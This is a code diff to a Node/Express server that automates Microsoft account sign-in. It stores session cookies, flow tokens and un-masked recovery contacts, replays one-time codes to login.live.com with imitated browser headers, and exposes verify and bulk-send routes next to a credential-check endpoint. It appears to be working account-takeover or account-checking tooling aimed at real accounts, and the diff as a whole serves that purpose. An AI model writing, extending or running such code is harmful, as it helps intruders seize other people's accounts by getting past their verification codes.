@@ -1,5 +1,6 @@
 import express from "express";
 import path from "path";
+import crypto from "crypto";
 import { fileURLToPath } from "url";
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
@@ -289,6 +290,147 @@ async function sendOneTimeCode(
 }
 
 /* ------------------------------------------------------------------ */
+/*  In-memory OTC session store                                       */
+/*  Holds the cookies + uaid + new flow token + proof metadata that   */
+/*  GetOneTimeCode.srf returns, so a later /api/verify-otc call has   */
+/*  everything it needs to POST the OTP back to Microsoft.            */
+/*  TTL is 10 min — Microsoft codes expire fast anyway.               */
+/* ------------------------------------------------------------------ */
+const otcSessions = new Map();
+const OTC_TTL_MS = 10 * 60 * 1000;
+
+function saveOtcSession(data) {
+  const id = crypto.randomUUID();
+  otcSessions.set(id, { ...data, createdAt: Date.now() });
+  const t = setTimeout(() => otcSessions.delete(id), OTC_TTL_MS);
+  if (typeof t.unref === "function") t.unref();
+  return id;
+}
+
+function getOtcSession(id) {
+  const s = otcSessions.get(id);
+  if (!s) return null;
+  if (Date.now() - s.createdAt > OTC_TTL_MS) {
+    otcSessions.delete(id);
+    return null;
+  }
+  return s;
+}
+
+/* ------------------------------------------------------------------ */
+/*  Verify a One-Time Code                                            */
+/*  Posts the OTP to ppsecure/post.srf with the FULL un-masked        */
+/*  alternate as ProofConfirmation and the encrypted proof token as   */
+/*  SentProofIDE. Reads the response to detect accept / wrong code.   */
+/* ------------------------------------------------------------------ */
+async function verifyOneTimeCode(
+  email,
+  session,
+  newFlowToken,
+  otcCode,
+  sentProofIDE,
+  proofConfirmation,
+  proofType,
+) {
+  const { uaid, cookies } = session;
+  const proofTypeNum = proofType === "phone" ? "3" : "1";
+
+  const params = new URLSearchParams({
+    SentProofIDE: sentProofIDE ?? "",
+    ProofConfirmation: proofConfirmation ?? "",
+    ProofType: proofTypeNum,
+    otc: otcCode,
+    ps: "3",
+    psRNGCDefaultType: "",
+    psRNGCEntropy: "",
+    psRNGCSLK: "",
+    canary: "",
+    ctx: "",
+    hpgrequestid: "",
+    PPFT: newFlowToken,
+    PPSX: "P",
+    NewUser: "1",
+    FoundMSAs: "",
+    fspost: "0",
+    i21: "0",
+    CookieDisclosure: "0",
+    IsFidoSupported: "1",
+    isSignupPost: "0",
+    isRecoveryAttemptPost: "0",
+    i13: "0",
+    login: email,
+    loginfmt: email,
+    type: "27",
+    LoginOptions: "3",
+    lrt: "",
+    lrtPartition: "",
+    hisRegion: "",
+    hisScaleUnit: "",
+    cpr: "0",
+  });
+
+  const verifyUrl =
+    `https://login.live.com/ppsecure/post.srf?` +
+    `username=${encodeURIComponent(email)}&uaid=${uaid}&pid=15216`;
+
+  const verifyRes = await fetch(verifyUrl, {
+    method: "POST",
+    redirect: "manual",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": UA,
+      Origin: "https://login.live.com",
+      Referer: "https://login.live.com/",
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-GB,en-US;q=0.9",
+      "Cache-Control": "max-age=0",
+      "Upgrade-Insecure-Requests": "1",
+      ...(cookies ? { Cookie: cookies } : {}),
+    },
+    body: params.toString(),
+  });
+
+  const status = verifyRes.status;
+  const location = verifyRes.headers.get("location") ?? "";
+  const bodyText = await verifyRes.text().catch(() => "");
+
+  // New flow token in case Microsoft hands us a chained step (e.g. passkey interrupt)
+  const newPPFTMatch = bodyText.match(/name=\\?"PPFT\\?"[^>]*?value=\\?"([^"\\]+)/);
+
+  // Success heuristics
+  const redirectedOut =
+    status >= 300 && status < 400 && !location.includes("login.live.com");
+
+  const bodyHasPasskeyInterrupt =
+    bodyText.includes("interrupt/passkey") ||
+    bodyText.includes("account.live.com");
+
+  // Wrong-code signals
+  const wrongCode =
+    bodyText.includes("otcInvalid") ||
+    bodyText.includes("InvalidOtc") ||
+    /the code you entered is( not| in)?valid/i.test(bodyText) ||
+    /that code didn't work/i.test(bodyText);
+
+  const otcAccepted =
+    redirectedOut ||
+    bodyHasPasskeyInterrupt ||
+    (status === 200 && !!newPPFTMatch && !wrongCode);
+
+  return {
+    success: otcAccepted && !wrongCode,
+    httpStatus: status,
+    redirectLocation: location || null,
+    nextFlowToken: newPPFTMatch ? newPPFTMatch[1] : null,
+    error: otcAccepted && !wrongCode
+      ? null
+      : wrongCode
+        ? "Incorrect OTP — please check the code and try again"
+        : "OTP verification failed — code may be expired",
+  };
+}
+
+/* ------------------------------------------------------------------ */
 /*  Routes                                                            */
 /* ------------------------------------------------------------------ */
 app.post("/api/credential-check", async (req, res) => {
@@ -418,11 +560,67 @@ app.post("/api/send-otc", async (req, res) => {
     proofConfirmation.trim(),
   );
 
+  let sessionId = null;
+  if (otcResult.success && otcResult.newFlowToken) {
+    sessionId = saveOtcSession({
+      email,
+      uaid: session.uaid,
+      cookies: session.cookies,
+      newFlowToken: otcResult.newFlowToken,
+      proofDisplay: proof.display,
+      proofType: proof.type,
+      sentProofIDE: proof.proofToken ?? null,
+      proofConfirmation: proofConfirmation.trim(),
+      channel: targetChannel,
+    });
+  }
+
   res.json({
     ...otcResult,
     email,
     proofDisplay: proof.display,
     channel: targetChannel,
+    sessionId,
+  });
+});
+
+/* ------------------------------------------------------------------ */
+/*  Verify a previously-sent OTC                                      */
+/*  Body: { sessionId, otc }                                          */
+/* ------------------------------------------------------------------ */
+app.post("/api/verify-otc", async (req, res) => {
+  const { sessionId, otc } = req.body ?? {};
+  if (!sessionId || typeof sessionId !== "string") {
+    return res.status(400).json({ success: false, error: "sessionId is required" });
+  }
+  if (!otc || !/^\d{4,12}$/.test(String(otc).trim())) {
+    return res.status(400).json({ success: false, error: "otc must be 4-12 digits" });
+  }
+
+  const s = getOtcSession(sessionId);
+  if (!s) {
+    return res.status(404).json({
+      success: false,
+      error: "Session not found or expired (codes are valid ~10 min)",
+    });
+  }
+
+  const fakeSession = { uaid: s.uaid, cookies: s.cookies };
+  const result = await verifyOneTimeCode(
+    s.email,
+    fakeSession,
+    s.newFlowToken,
+    String(otc).trim(),
+    s.sentProofIDE,
+    s.proofConfirmation,
+    s.proofType,
+  );
+
+  res.json({
+    ...result,
+    email: s.email,
+    proofDisplay: s.proofDisplay,
+    channel: s.channel,
   });
 });
 
@@ -506,12 +704,33 @@ app.post("/api/send-otc/bulk", async (req, res) => {
         alternate,
       );
 
+      // If Microsoft accepted the send (State 201), persist everything
+      // /api/verify-otc will need: cookies + uaid + the new flow token
+      // Microsoft handed back, plus the encrypted proof token and full
+      // un-masked alternate so we can echo them as SentProofIDE +
+      // ProofConfirmation when posting the OTP.
+      let sessionId = null;
+      if (otc.success && otc.newFlowToken) {
+        sessionId = saveOtcSession({
+          email,
+          uaid: session.uaid,
+          cookies: session.cookies,
+          newFlowToken: otc.newFlowToken,
+          proofDisplay: proof.display,
+          proofType: proof.type,
+          sentProofIDE: proof.proofToken ?? null,
+          proofConfirmation: alternate,
+          channel: reqChannel,
+        });
+      }
+
       results.push({
         ...base,
         proofDisplay: proof.display,
         success: otc.success,
         state: otc.state,
         error: otc.error,
+        sessionId,
       });
     } catch (err) {
       results.push({ ...base, success: false, error: err?.message ?? "Unknown error" });
